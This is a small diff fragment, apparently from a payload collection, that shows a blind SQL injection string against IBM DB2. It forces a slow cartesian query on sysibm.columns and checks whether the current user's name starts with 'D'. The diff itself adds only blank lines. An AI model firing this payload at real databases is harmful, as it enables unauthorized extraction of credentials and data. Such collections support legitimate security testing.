@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:03.401674+00:00'
 ```sql
 ' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
 ```
+
+
